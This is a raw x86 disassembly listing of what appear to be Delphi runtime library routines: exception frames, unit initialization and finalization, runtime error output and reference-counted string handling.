  4036b0:	64 89 02             	mov    %eax,%fs:(%edx)
  4036b3:	89 08                	mov    %ecx,(%eax)
  4036b5:	c7 40 04 08 36 40 00 	movl   $0x403608,0x4(%eax)
  4036bc:	89 68 08             	mov    %ebp,0x8(%eax)
  4036bf:	a3 34 46 42 00       	mov    %eax,0x424634
  4036c4:	c3                   	ret
  4036c5:	8d 40 00             	lea    0x0(%eax),%eax
  4036c8:	31 d2                	xor    %edx,%edx
  4036ca:	a1 34 46 42 00       	mov    0x424634,%eax
  4036cf:	85 c0                	test   %eax,%eax
  4036d1:	74 1c                	je     0x4036ef
  4036d3:	64 8b 0a             	mov    %fs:(%edx),%ecx
  4036d6:	39 c8                	cmp    %ecx,%eax
  4036d8:	75 08                	jne    0x4036e2
  4036da:	8b 00                	mov    (%eax),%eax
  4036dc:	64 89 02             	mov    %eax,%fs:(%edx)
  4036df:	c3                   	ret
  4036e0:	8b 09                	mov    (%ecx),%ecx
  4036e2:	83 f9 ff             	cmp    $0xffffffff,%ecx
  4036e5:	74 08                	je     0x4036ef
  4036e7:	39 01                	cmp    %eax,(%ecx)
  4036e9:	75 f5                	jne    0x4036e0
  4036eb:	8b 00                	mov    (%eax),%eax
  4036ed:	89 01                	mov    %eax,(%ecx)
  4036ef:	c3                   	ret
  4036f0:	55                   	push   %ebp
  4036f1:	8b ec                	mov    %esp,%ebp
  4036f3:	53                   	push   %ebx
  4036f4:	56                   	push   %esi
  4036f5:	57                   	push   %edi
  4036f6:	bf 30 46 42 00       	mov    $0x424630,%edi
  4036fb:	8b 47 08             	mov    0x8(%edi),%eax
  4036fe:	85 c0                	test   %eax,%eax
  403700:	74 48                	je     0x40374a
  403702:	8b 5f 0c             	mov    0xc(%edi),%ebx
  403705:	8b 70 04             	mov    0x4(%eax),%esi
  403708:	33 d2                	xor    %edx,%edx
  40370a:	55                   	push   %ebp
  40370b:	68 36 37 40 00       	push   $0x403736
  403710:	64 ff 32             	push   %fs:(%edx)
  403713:	64 89 22             	mov    %esp,%fs:(%edx)
  403716:	85 db                	test   %ebx,%ebx
  403718:	7e 12                	jle    0x40372c
  40371a:	4b                   	dec    %ebx
  40371b:	89 5f 0c             	mov    %ebx,0xc(%edi)
  40371e:	8b 44 de 04          	mov    0x4(%esi,%ebx,8),%eax
  403722:	85 c0                	test   %eax,%eax
  403724:	74 02                	je     0x403728
  403726:	ff d0                	call   *%eax
  403728:	85 db                	test   %ebx,%ebx
  40372a:	7f ee                	jg     0x40371a
  40372c:	33 c0                	xor    %eax,%eax
  40372e:	5a                   	pop    %edx
  40372f:	59                   	pop    %ecx
  403730:	59                   	pop    %ecx
  403731:	64 89 10             	mov    %edx,%fs:(%eax)
  403734:	eb 14                	jmp    0x40374a
  403736:	e9 05 fc ff ff       	jmp    0x403340
  40373b:	e8 b0 ff ff ff       	call   0x4036f0
  403740:	e8 87 fd ff ff       	call   0x4034cc
  403745:	e8 d6 fd ff ff       	call   0x403520
  40374a:	5f                   	pop    %edi
  40374b:	5e                   	pop    %esi
  40374c:	5b                   	pop    %ebx
  40374d:	5d                   	pop    %ebp
  40374e:	c3                   	ret
  40374f:	90                   	nop
  403750:	55                   	push   %ebp
  403751:	8b ec                	mov    %esp,%ebp
  403753:	53                   	push   %ebx
  403754:	56                   	push   %esi
  403755:	57                   	push   %edi
  403756:	a1 38 46 42 00       	mov    0x424638,%eax
  40375b:	85 c0                	test   %eax,%eax
  40375d:	74 4b                	je     0x4037aa
  40375f:	8b 30                	mov    (%eax),%esi
  403761:	33 db                	xor    %ebx,%ebx
  403763:	8b 78 04             	mov    0x4(%eax),%edi
  403766:	33 d2                	xor    %edx,%edx
  403768:	55                   	push   %ebp
  403769:	68 96 37 40 00       	push   $0x403796
  40376e:	64 ff 32             	push   %fs:(%edx)
  403771:	64 89 22             	mov    %esp,%fs:(%edx)
  403774:	3b f3                	cmp    %ebx,%esi
  403776:	7e 14                	jle    0x40378c
  403778:	8b 04 df             	mov    (%edi,%ebx,8),%eax
  40377b:	43                   	inc    %ebx
  40377c:	89 1d 3c 46 42 00    	mov    %ebx,0x42463c
  403782:	85 c0                	test   %eax,%eax
  403784:	74 02                	je     0x403788
  403786:	ff d0                	call   *%eax
  403788:	3b f3                	cmp    %ebx,%esi
  40378a:	7f ec                	jg     0x403778
  40378c:	33 c0                	xor    %eax,%eax
  40378e:	5a                   	pop    %edx
  40378f:	59                   	pop    %ecx
  403790:	59                   	pop    %ecx
  403791:	64 89 10             	mov    %edx,%fs:(%eax)
  403794:	eb 14                	jmp    0x4037aa
  403796:	e9 a5 fb ff ff       	jmp    0x403340
  40379b:	e8 50 ff ff ff       	call   0x4036f0
  4037a0:	e8 27 fd ff ff       	call   0x4034cc
  4037a5:	e8 76 fd ff ff       	call   0x403520
  4037aa:	5f                   	pop    %edi
  4037ab:	5e                   	pop    %esi
  4037ac:	5b                   	pop    %ebx
  4037ad:	5d                   	pop    %ebp
  4037ae:	c3                   	ret
  4037af:	90                   	nop
  4037b0:	c7 05 14 40 42 00 68 	movl   $0x401168,0x424014
  4037b7:	11 40 00 
  4037ba:	c7 05 18 40 42 00 70 	movl   $0x401170,0x424018
  4037c1:	11 40 00 
  4037c4:	a3 38 46 42 00       	mov    %eax,0x424638
  4037c9:	33 c0                	xor    %eax,%eax
  4037cb:	a3 3c 46 42 00       	mov    %eax,0x42463c
  4037d0:	89 15 40 46 42 00    	mov    %edx,0x424640
  4037d6:	8b 42 04             	mov    0x4(%edx),%eax
  4037d9:	a3 2c 40 42 00       	mov    %eax,0x42402c
  4037de:	e8 c5 fe ff ff       	call   0x4036a8
  4037e3:	c6 05 34 40 42 00 00 	movb   $0x0,0x424034
  4037ea:	e8 61 ff ff ff       	call   0x403750
  4037ef:	c3                   	ret
  4037f0:	53                   	push   %ebx
  4037f1:	31 db                	xor    %ebx,%ebx
  4037f3:	57                   	push   %edi
  4037f4:	56                   	push   %esi
  4037f5:	8b 3c 18             	mov    (%eax,%ebx,1),%edi
  4037f8:	8d 74 18 04          	lea    0x4(%eax,%ebx,1),%esi
  4037fc:	8b 46 04             	mov    0x4(%esi),%eax
  4037ff:	8b 16                	mov    (%esi),%edx
  403801:	8b 04 18             	mov    (%eax,%ebx,1),%eax
  403804:	01 da                	add    %ebx,%edx
  403806:	e8 b1 1b 00 00       	call   0x4053bc
  40380b:	83 c6 08             	add    $0x8,%esi
  40380e:	4f                   	dec    %edi
  40380f:	75 eb                	jne    0x4037fc
  403811:	5e                   	pop    %esi
  403812:	5f                   	pop    %edi
  403813:	5b                   	pop    %ebx
  403814:	c3                   	ret
  403815:	8d 40 00             	lea    0x0(%eax),%eax
  403818:	53                   	push   %ebx
  403819:	31 db                	xor    %ebx,%ebx
  40381b:	57                   	push   %edi
  40381c:	56                   	push   %esi
  40381d:	8b 3c 18             	mov    (%eax,%ebx,1),%edi
  403820:	8d 74 18 04          	lea    0x4(%eax,%ebx,1),%esi
  403824:	8b 46 04             	mov    0x4(%esi),%eax
  403827:	8b 16                	mov    (%esi),%edx
  403829:	8b 04 18             	mov    (%eax,%ebx,1),%eax
  40382c:	03 46 08             	add    0x8(%esi),%eax
  40382f:	89 04 1a             	mov    %eax,(%edx,%ebx,1)
  403832:	83 c6 0c             	add    $0xc,%esi
  403835:	4f                   	dec    %edi
  403836:	75 ec                	jne    0x403824
  403838:	5e                   	pop    %esi
  403839:	5f                   	pop    %edi
  40383a:	5b                   	pop    %ebx
  40383b:	c3                   	ret
  40383c:	53                   	push   %ebx
  40383d:	56                   	push   %esi
  40383e:	57                   	push   %edi
  40383f:	be 68 40 41 00       	mov    $0x414068,%esi
  403844:	b1 10                	mov    $0x10,%cl
  403846:	8b 1d 00 40 41 00    	mov    0x414000,%ebx
  40384c:	8b c3                	mov    %ebx,%eax
  40384e:	bf 0a 00 00 00       	mov    $0xa,%edi
  403853:	99                   	cltd
  403854:	f7 ff                	idiv   %edi
  403856:	80 c2 30             	add    $0x30,%dl
  403859:	33 c0                	xor    %eax,%eax
  40385b:	8a c1                	mov    %cl,%al
  40385d:	88 14 06             	mov    %dl,(%esi,%eax,1)
  403860:	8b c3                	mov    %ebx,%eax
  403862:	bb 0a 00 00 00       	mov    $0xa,%ebx
  403867:	99                   	cltd
  403868:	f7 fb                	idiv   %ebx
  40386a:	8b d8                	mov    %eax,%ebx
  40386c:	49                   	dec    %ecx
  40386d:	85 db                	test   %ebx,%ebx
  40386f:	75 db                	jne    0x40384c
  403871:	b1 1c                	mov    $0x1c,%cl
  403873:	a1 04 40 41 00       	mov    0x414004,%eax
  403878:	8b d0                	mov    %eax,%edx
  40387a:	83 e2 0f             	and    $0xf,%edx
  40387d:	8a 92 88 40 41 00    	mov    0x414088(%edx),%dl
  403883:	33 db                	xor    %ebx,%ebx
  403885:	8a d9                	mov    %cl,%bl
  403887:	88 14 1e             	mov    %dl,(%esi,%ebx,1)
  40388a:	c1 e8 04             	shr    $0x4,%eax
  40388d:	49                   	dec    %ecx
  40388e:	85 c0                	test   %eax,%eax
  403890:	75 e6                	jne    0x403878
  403892:	5f                   	pop    %edi
  403893:	5e                   	pop    %esi
  403894:	5b                   	pop    %ebx
  403895:	c3                   	ret
  403896:	8b c0                	mov    %eax,%eax
  403898:	31 c0                	xor    %eax,%eax
  40389a:	87 05 00 40 41 00    	xchg   %eax,0x414000
  4038a0:	f7 d8                	neg    %eax
  4038a2:	19 c0                	sbb    %eax,%eax
  4038a4:	40                   	inc    %eax
  4038a5:	bf 30 46 42 00       	mov    $0x424630,%edi
  4038aa:	8b 5f 18             	mov    0x18(%edi),%ebx
  4038ad:	8b 6f 14             	mov    0x14(%edi),%ebp
  4038b0:	ff 77 1c             	push   0x1c(%edi)
  4038b3:	ff 77 20             	push   0x20(%edi)
  4038b6:	8b 37                	mov    (%edi),%esi
  4038b8:	b9 0b 00 00 00       	mov    $0xb,%ecx
  4038bd:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4038bf:	5f                   	pop    %edi
  4038c0:	5e                   	pop    %esi
  4038c1:	c9                   	leave
  4038c2:	c2 0c 00             	ret    $0xc
  4038c5:	c3                   	ret
  4038c6:	8b c0                	mov    %eax,%eax
  4038c8:	51                   	push   %ecx
  4038c9:	80 3d 44 40 42 00 00 	cmpb   $0x0,0x424044
  4038d0:	74 57                	je     0x403929
  4038d2:	66 81 3d 18 42 42 00 	cmpw   $0xd7b2,0x424218
  4038d9:	b2 d7 
  4038db:	75 14                	jne    0x4038f1
  4038dd:	83 3d 20 42 42 00 00 	cmpl   $0x0,0x424220
  4038e4:	76 0b                	jbe    0x4038f1
  4038e6:	b8 14 42 42 00       	mov    $0x424214,%eax
  4038eb:	ff 15 30 42 42 00    	call   *0x424230
  4038f1:	6a 00                	push   $0x0
  4038f3:	8d 44 24 04          	lea    0x4(%esp),%eax
  4038f7:	50                   	push   %eax
  4038f8:	6a 1e                	push   $0x1e
  4038fa:	68 68 40 41 00       	push   $0x414068
  4038ff:	6a f5                	push   $0xfffffff5
  403901:	e8 5a d8 ff ff       	call   0x401160
  403906:	50                   	push   %eax
  403907:	e8 74 d8 ff ff       	call   0x401180
  40390c:	6a 00                	push   $0x0
  40390e:	8d 44 24 04          	lea    0x4(%esp),%eax
  403912:	50                   	push   %eax
  403913:	6a 02                	push   $0x2
  403915:	68 50 39 40 00       	push   $0x403950
  40391a:	6a f5                	push   $0xfffffff5
  40391c:	e8 3f d8 ff ff       	call   0x401160
  403921:	50                   	push   %eax
  403922:	e8 59 d8 ff ff       	call   0x401180
  403927:	5a                   	pop    %edx
  403928:	c3                   	ret
  403929:	80 3d 2c 40 41 00 00 	cmpb   $0x0,0x41402c
  403930:	75 13                	jne    0x403945
  403932:	6a 00                	push   $0x0
  403934:	68 60 40 41 00       	push   $0x414060
  403939:	68 68 40 41 00       	push   $0x414068
  40393e:	6a 00                	push   $0x0
  403940:	e8 53 d8 ff ff       	call   0x401198
  403945:	5a                   	pop    %edx
  403946:	c3                   	ret
  403947:	00 ff                	add    %bh,%bh
  403949:	ff                   	(bad)
  40394a:	ff                   	(bad)
  40394b:	ff 02                	incl   (%edx)
  40394d:	00 00                	add    %al,(%eax)
  40394f:	00 0d 0a 00 00 53    	add    %cl,0x5300000a
  403955:	56                   	push   %esi
  403956:	57                   	push   %edi
  403957:	55                   	push   %ebp
  403958:	bb 30 46 42 00       	mov    $0x424630,%ebx
  40395d:	be 00 40 41 00       	mov    $0x414000,%esi
  403962:	bf 40 40 42 00       	mov    $0x424040,%edi
  403967:	80 7b 28 00          	cmpb   $0x0,0x28(%ebx)
  40396b:	75 16                	jne    0x403983
  40396d:	83 3f 00             	cmpl   $0x0,(%edi)
  403970:	74 11                	je     0x403983
  403972:	8b 17                	mov    (%edi),%edx
  403974:	89 d0                	mov    %edx,%eax
  403976:	33 d2                	xor    %edx,%edx
  403978:	89 17                	mov    %edx,(%edi)
  40397a:	8b e8                	mov    %eax,%ebp
  40397c:	ff d5                	call   *%ebp
  40397e:	83 3f 00             	cmpl   $0x0,(%edi)
  403981:	75 ef                	jne    0x403972
  403983:	83 3d 04 40 41 00 00 	cmpl   $0x0,0x414004
  40398a:	74 11                	je     0x40399d
  40398c:	e8 ab fe ff ff       	call   0x40383c
  403991:	e8 32 ff ff ff       	call   0x4038c8
  403996:	33 c0                	xor    %eax,%eax
  403998:	a3 04 40 41 00       	mov    %eax,0x414004
  40399d:	80 7b 28 02          	cmpb   $0x2,0x28(%ebx)
  4039a1:	75 0a                	jne    0x4039ad
  4039a3:	83 3e 00             	cmpl   $0x0,(%esi)
  4039a6:	75 05                	jne    0x4039ad
  4039a8:	33 c0                	xor    %eax,%eax
  4039aa:	89 43 0c             	mov    %eax,0xc(%ebx)
  4039ad:	e8 3e fd ff ff       	call   0x4036f0
  4039b2:	80 7b 28 01          	cmpb   $0x1,0x28(%ebx)
  4039b6:	76 05                	jbe    0x4039bd
  4039b8:	83 3e 00             	cmpl   $0x0,(%esi)
  4039bb:	74 21                	je     0x4039de
  4039bd:	8b 43 10             	mov    0x10(%ebx),%eax
  4039c0:	85 c0                	test   %eax,%eax
  4039c2:	74 1a                	je     0x4039de
  4039c4:	e8 fb 14 00 00       	call   0x404ec4
  4039c9:	8b 53 10             	mov    0x10(%ebx),%edx
  4039cc:	8b 42 10             	mov    0x10(%edx),%eax
  4039cf:	3b 42 04             	cmp    0x4(%edx),%eax
  4039d2:	74 0a                	je     0x4039de
  4039d4:	85 c0                	test   %eax,%eax
  4039d6:	74 06                	je     0x4039de
  4039d8:	50                   	push   %eax
  4039d9:	e8 d2 d7 ff ff       	call   0x4011b0
  4039de:	e8 e5 fc ff ff       	call   0x4036c8
  4039e3:	80 7b 28 01          	cmpb   $0x1,0x28(%ebx)
  4039e7:	75 03                	jne    0x4039ec
  4039e9:	ff 53 24             	call   *0x24(%ebx)
  4039ec:	80 7b 28 00          	cmpb   $0x0,0x28(%ebx)
  4039f0:	74 05                	je     0x4039f7
  4039f2:	e8 a1 fe ff ff       	call   0x403898
  4039f7:	83 3b 00             	cmpl   $0x0,(%ebx)
  4039fa:	75 17                	jne    0x403a13
  4039fc:	83 3d 24 40 42 00 00 	cmpl   $0x0,0x424024
  403a03:	74 06                	je     0x403a0b
  403a05:	ff 15 24 40 42 00    	call   *0x424024
  403a0b:	8b 06                	mov    (%esi),%eax
  403a0d:	50                   	push   %eax
  403a0e:	e8 7d d7 ff ff       	call   0x401190
  403a13:	8b 03                	mov    (%ebx),%eax
  403a15:	56                   	push   %esi
  403a16:	8b f0                	mov    %eax,%esi
  403a18:	8b fb                	mov    %ebx,%edi
  403a1a:	b9 0b 00 00 00       	mov    $0xb,%ecx
  403a1f:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403a21:	5e                   	pop    %esi
  403a22:	e9 76 ff ff ff       	jmp    0x40399d
  403a27:	5d                   	pop    %ebp
  403a28:	5f                   	pop    %edi
  403a29:	5e                   	pop    %esi
  403a2a:	5b                   	pop    %ebx
  403a2b:	c3                   	ret
  403a2c:	a3 00 40 41 00       	mov    %eax,0x414000
  403a31:	e8 1e ff ff ff       	call   0x403954
  403a36:	c3                   	ret
  403a37:	90                   	nop
  403a38:	8f 05 04 40 41 00    	pop    0x414004
  403a3e:	e9 e9 ff ff ff       	jmp    0x403a2c
  403a43:	c3                   	ret
  403a44:	8b 10                	mov    (%eax),%edx
  403a46:	85 d2                	test   %edx,%edx
  403a48:	74 1c                	je     0x403a66
  403a4a:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  403a50:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403a53:	49                   	dec    %ecx
  403a54:	7c 10                	jl     0x403a66
  403a56:	f0 ff 4a f8          	lock decl -0x8(%edx)
  403a5a:	75 0a                	jne    0x403a66
  403a5c:	50                   	push   %eax
  403a5d:	8d 42 f8             	lea    -0x8(%edx),%eax
  403a60:	e8 e3 eb ff ff       	call   0x402648
  403a65:	58                   	pop    %eax
  403a66:	c3                   	ret
  403a67:	90                   	nop
  403a68:	53                   	push   %ebx
  403a69:	56                   	push   %esi
  403a6a:	89 c3                	mov    %eax,%ebx
  403a6c:	89 d6                	mov    %edx,%esi
  403a6e:	8b 13                	mov    (%ebx),%edx
  403a70:	85 d2                	test   %edx,%edx
  403a72:	74 1a                	je     0x403a8e
  403a74:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  403a7a:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403a7d:	49                   	dec    %ecx
  403a7e:	7c 0e                	jl     0x403a8e
  403a80:	f0 ff 4a f8          	lock decl -0x8(%edx)
  403a84:	75 08                	jne    0x403a8e
  403a86:	8d 42 f8             	lea    -0x8(%edx),%eax
  403a89:	e8 ba eb ff ff       	call   0x402648
  403a8e:	83 c3 04             	add    $0x4,%ebx
  403a91:	4e                   	dec    %esi
  403a92:	75 da                	jne    0x403a6e
  403a94:	5e                   	pop    %esi
  403a95:	5b                   	pop    %ebx
  403a96:	c3                   	ret
  403a97:	90                   	nop
  403a98:	85 d2                	test   %edx,%edx
  403a9a:	74 24                	je     0x403ac0
  403a9c:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403a9f:	41                   	inc    %ecx
  403aa0:	7f 1a                	jg     0x403abc
  403aa2:	50                   	push   %eax
  403aa3:	52                   	push   %edx
  403aa4:	8b 42 fc             	mov    -0x4(%edx),%eax
  403aa7:	e8 5c 00 00 00       	call   0x403b08
  403aac:	89 c2                	mov    %eax,%edx
  403aae:	58                   	pop    %eax
  403aaf:	52                   	push   %edx
  403ab0:	8b 48 fc             	mov    -0x4(%eax),%ecx
  403ab3:	e8 f8 ec ff ff       	call   0x4027b0
  403ab8:	5a                   	pop    %edx
  403ab9:	58                   	pop    %eax
  403aba:	eb 04                	jmp    0x403ac0
  403abc:	f0 ff 42 f8          	lock incl -0x8(%edx)
  403ac0:	87 10                	xchg   %edx,(%eax)
  403ac2:	85 d2                	test   %edx,%edx
  403ac4:	74 14                	je     0x403ada
  403ac6:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403ac9:	49                   	dec    %ecx
  403aca:	7c 0e                	jl     0x403ada
  403acc:	f0 ff 4a f8          	lock decl -0x8(%edx)
  403ad0:	75 08                	jne    0x403ada
  403ad2:	8d 42 f8             	lea    -0x8(%edx),%eax
  403ad5:	e8 6e eb ff ff       	call   0x402648
  403ada:	c3                   	ret
  403adb:	90                   	nop
  403adc:	85 d2                	test   %edx,%edx
  403ade:	74 0a                	je     0x403aea
  403ae0:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403ae3:	41                   	inc    %ecx
  403ae4:	7e 04                	jle    0x403aea
  403ae6:	f0 ff 42 f8          	lock incl -0x8(%edx)
  403aea:	87 10                	xchg   %edx,(%eax)
  403aec:	85 d2                	test   %edx,%edx
  403aee:	74 14                	je     0x403b04
  403af0:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403af3:	49                   	dec    %ecx
  403af4:	7c 0e                	jl     0x403b04
  403af6:	f0 ff 4a f8          	lock decl -0x8(%edx)
  403afa:	75 08                	jne    0x403b04
  403afc:	8d 42 f8             	lea    -0x8(%edx),%eax
  403aff:	e8 44 eb ff ff       	call   0x402648
  403b04:	c3                   	ret
  403b05:	8d 40 00             	lea    0x0(%eax),%eax
  403b08:	85 c0                	test   %eax,%eax
  403b0a:	7e 24                	jle    0x403b30
  403b0c:	50                   	push   %eax
  403b0d:	83 c0 0a             	add    $0xa,%eax
  403b10:	83 e0 fe             	and    $0xfffffffe,%eax
  403b13:	50                   	push   %eax
  403b14:	e8 0f eb ff ff       	call   0x402628
  403b19:	5a                   	pop    %edx
  403b1a:	66 c7 44 02 fe 00 00 	movw   $0x0,-0x2(%edx,%eax,1)
  403b21:	83 c0 08             	add    $0x8,%eax
  403b24:	5a                   	pop    %edx
  403b25:	89 50 fc             	mov    %edx,-0x4(%eax)
  403b28:	c7 40 f8 01 00 00 00 	movl   $0x1,-0x8(%eax)
  403b2f:	c3                   	ret
  403b30:	31 c0                	xor    %eax,%eax
  403b32:	c3                   	ret
  403b33:	90                   	nop
  403b34:	53                   	push   %ebx
  403b35:	56                   	push   %esi
  403b36:	57                   	push   %edi
  403b37:	89 c3                	mov    %eax,%ebx
  403b39:	89 d6                	mov    %edx,%esi
  403b3b:	89 cf                	mov    %ecx,%edi
  403b3d:	89 f8                	mov    %edi,%eax
  403b3f:	e8 c4 ff ff ff       	call   0x403b08
  403b44:	89 f9                	mov    %edi,%ecx
  403b46:	89 c7                	mov    %eax,%edi
  403b48:	85 f6                	test   %esi,%esi
  403b4a:	74 09                	je     0x403b55
  403b4c:	89 c2                	mov    %eax,%edx
  403b4e:	89 f0                	mov    %esi,%eax
  403b50:	e8 5b ec ff ff       	call   0x4027b0
  403b55:	89 d8                	mov    %ebx,%eax
  403b57:	e8 e8 fe ff ff       	call   0x403a44
  403b5c:	89 3b                	mov    %edi,(%ebx)
  403b5e:	5f                   	pop    %edi
  403b5f:	5e                   	pop    %esi
  403b60:	5b                   	pop    %ebx
  403b61:	c3                   	ret
  403b62:	8b c0                	mov    %eax,%eax
  403b64:	55                   	push   %ebp
  403b65:	8b ec                	mov    %esp,%ebp
  403b67:	6a 00                	push   $0x0
  403b69:	6a 00                	push   $0x0
  403b6b:	52                   	push   %edx
  403b6c:	50                   	push   %eax
  403b6d:	8b 45 08             	mov    0x8(%ebp),%eax
  403b70:	50                   	push   %eax
  403b71:	51                   	push   %ecx
  403b72:	6a 00                	push   $0x0
  403b74:	a1 b8 45 42 00       	mov    0x4245b8,%eax
  403b79:	50                   	push   %eax
  403b7a:	e8 b1 d6 ff ff       	call   0x401230
  403b7f:	5d                   	pop    %ebp
  403b80:	c2 04 00             	ret    $0x4
  403b83:	90                   	nop
  403b84:	55                   	push   %ebp
  403b85:	8b ec                	mov    %esp,%ebp
  403b87:	52                   	push   %edx
  403b88:	50                   	push   %eax
  403b89:	8b 45 08             	mov    0x8(%ebp),%eax
  403b8c:	50                   	push   %eax
  403b8d:	51                   	push   %ecx
  403b8e:	6a 00                	push   $0x0
  403b90:	a1 b8 45 42 00       	mov    0x4245b8,%eax
  403b95:	50                   	push   %eax
  403b96:	e8 75 d6 ff ff       	call   0x401210
  403b9b:	5d                   	pop    %ebp
  403b9c:	c2 04 00             	ret    $0x4
  403b9f:	90                   	nop
  403ba0:	53                   	push   %ebx
  403ba1:	56                   	push   %esi
  403ba2:	57                   	push   %edi
  403ba3:	55                   	push   %ebp
  403ba4:	81 c4 04 f0 ff ff    	add    $0xfffff004,%esp
  403baa:	50                   	push   %eax
  403bab:	83 c4 fc             	add    $0xfffffffc,%esp
  403bae:	8b f1                	mov    %ecx,%esi
  403bb0:	89 14 24             	mov    %edx,(%esp)
  403bb3:	8b f8                	mov    %eax,%edi
  403bb5:	85 f6                	test   %esi,%esi
  403bb7:	7f 09                	jg     0x403bc2
  403bb9:	8b c7                	mov    %edi,%eax
  403bbb:	e8 84 fe ff ff       	call   0x403a44
  403bc0:	eb 5f                	jmp    0x403c21
  403bc2:	8d 6e 01             	lea    0x1(%esi),%ebp
  403bc5:	81 fd ff 07 00 00    	cmp    $0x7ff,%ebp
  403bcb:	7d 28                	jge    0x403bf5
  403bcd:	56                   	push   %esi
  403bce:	8d 44 24 08          	lea    0x8(%esp),%eax
  403bd2:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403bd6:	ba ff 0f 00 00       	mov    $0xfff,%edx
  403bdb:	e8 84 ff ff ff       	call   0x403b64
  403be0:	8b d8                	mov    %eax,%ebx
  403be2:	85 db                	test   %ebx,%ebx
  403be4:	7c 0f                	jl     0x403bf5
  403be6:	8d 54 24 04          	lea    0x4(%esp),%edx
  403bea:	8b c7                	mov    %edi,%eax
  403bec:	8b cb                	mov    %ebx,%ecx
  403bee:	e8 41 ff ff ff       	call   0x403b34
  403bf3:	eb 2c                	jmp    0x403c21
  403bf5:	8b dd                	mov    %ebp,%ebx
  403bf7:	03 db                	add    %ebx,%ebx
  403bf9:	8b c7                	mov    %edi,%eax
  403bfb:	8b d3                	mov    %ebx,%edx
  403bfd:	e8 0e 04 00 00       	call   0x404010
  403c02:	56                   	push   %esi
  403c03:	8b 07                	mov    (%edi),%eax
  403c05:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403c09:	8b d3                	mov    %ebx,%edx
  403c0b:	e8 54 ff ff ff       	call   0x403b64
  403c10:	8b d8                	mov    %eax,%ebx
  403c12:	85 db                	test   %ebx,%ebx
  403c14:	7d 02                	jge    0x403c18
  403c16:	33 db                	xor    %ebx,%ebx
  403c18:	8b c7                	mov    %edi,%eax
  403c1a:	8b d3                	mov    %ebx,%edx
  403c1c:	e8 ef 03 00 00       	call   0x404010
  403c21:	81 c4 04 10 00 00    	add    $0x1004,%esp
  403c27:	5d                   	pop    %ebp
  403c28:	5f                   	pop    %edi
  403c29:	5e                   	pop    %esi
  403c2a:	5b                   	pop    %ebx
  403c2b:	c3                   	ret
  403c2c:	52                   	push   %edx
  403c2d:	89 e2                	mov    %esp,%edx
  403c2f:	b9 01 00 00 00       	mov    $0x1,%ecx
  403c34:	e8 fb fe ff ff       	call   0x403b34
  403c39:	5a                   	pop    %edx
  403c3a:	c3                   	ret
  403c3b:	90                   	nop
  403c3c:	31 c9                	xor    %ecx,%ecx
  403c3e:	85 d2                	test   %edx,%edx
  403c40:	74 21                	je     0x403c63
  403c42:	52                   	push   %edx
  403c43:	3a 0a                	cmp    (%edx),%cl
  403c45:	74 17                	je     0x403c5e
  403c47:	3a 4a 01             	cmp    0x1(%edx),%cl
  403c4a:	74 11                	je     0x403c5d
  403c4c:	3a 4a 02             	cmp    0x2(%edx),%cl
  403c4f:	74 0b                	je     0x403c5c
  403c51:	3a 4a 03             	cmp    0x3(%edx),%cl
  403c54:	74 05                	je     0x403c5b
  403c56:	83 c2 04             	add    $0x4,%edx
  403c59:	eb e8                	jmp    0x403c43
  403c5b:	42                   	inc    %edx
  403c5c:	42                   	inc    %edx
  403c5d:	42                   	inc    %edx
  403c5e:	89 d1                	mov    %edx,%ecx
  403c60:	5a                   	pop    %edx
  403c61:	29 d1                	sub    %edx,%ecx
  403c63:	e9 cc fe ff ff       	jmp    0x403b34
  403c68:	c3                   	ret
  403c69:	8d 40 00             	lea    0x0(%eax),%eax
  403c6c:	31 c9                	xor    %ecx,%ecx
  403c6e:	85 d2                	test   %edx,%edx
  403c70:	74 2d                	je     0x403c9f
  403c72:	52                   	push   %edx
  403c73:	66 3b 0a             	cmp    (%edx),%cx
  403c76:	74 20                	je     0x403c98
  403c78:	66 3b 4a 02          	cmp    0x2(%edx),%cx
  403c7c:	74 17                	je     0x403c95
  403c7e:	66 3b 4a 04          	cmp    0x4(%edx),%cx
  403c82:	74 0e                	je     0x403c92
  403c84:	66 3b 4a 06          	cmp    0x6(%edx),%cx
  403c88:	74 05                	je     0x403c8f
  403c8a:	83 c2 08             	add    $0x8,%edx
  403c8d:	eb e4                	jmp    0x403c73
  403c8f:	83 c2 02             	add    $0x2,%edx
  403c92:	83 c2 02             	add    $0x2,%edx
  403c95:	83 c2 02             	add    $0x2,%edx
  403c98:	89 d1                	mov    %edx,%ecx
  403c9a:	5a                   	pop    %edx
  403c9b:	29 d1                	sub    %edx,%ecx
  403c9d:	d1 e9                	shr    $1,%ecx
  403c9f:	e9 fc fe ff ff       	jmp    0x403ba0
  403ca4:	c3                   	ret
  403ca5:	8d 40 00             	lea    0x0(%eax),%eax
  403ca8:	31 c9                	xor    %ecx,%ecx
  403caa:	8a 0a                	mov    (%edx),%cl
  403cac:	42                   	inc    %edx
  403cad:	e9 82 fe ff ff       	jmp    0x403b34
  403cb2:	c3                   	ret
  403cb3:	90                   	nop
  403cb4:	57                   	push   %edi
  403cb5:	50                   	push   %eax
  403cb6:	51                   	push   %ecx
  403cb7:	89 d7                	mov    %edx,%edi
  403cb9:	31 c0                	xor    %eax,%eax
  403cbb:	f2 ae                	repnz scas %es:(%edi),%al
  403cbd:	75 02                	jne    0x403cc1
  403cbf:	f7 d1                	not    %ecx
  403cc1:	58                   	pop    %eax
  403cc2:	01 c1                	add    %eax,%ecx
  403cc4:	58                   	pop    %eax
  403cc5:	5f                   	pop    %edi
  403cc6:	e9 69 fe ff ff       	jmp    0x403b34
  403ccb:	c3                   	ret
  403ccc:	31 c9                	xor    %ecx,%ecx
  403cce:	85 d2                	test   %edx,%edx
  403cd0:	74 05                	je     0x403cd7
  403cd2:	8b 4a fc             	mov    -0x4(%edx),%ecx
  403cd5:	d1 e9                	shr    $1,%ecx
  403cd7:	e9 c4 fe ff ff       	jmp    0x403ba0
  403cdc:	c3                   	ret
  403cdd:	8d 40 00             	lea    0x0(%eax),%eax
  403ce0:	85 c0                	test   %eax,%eax
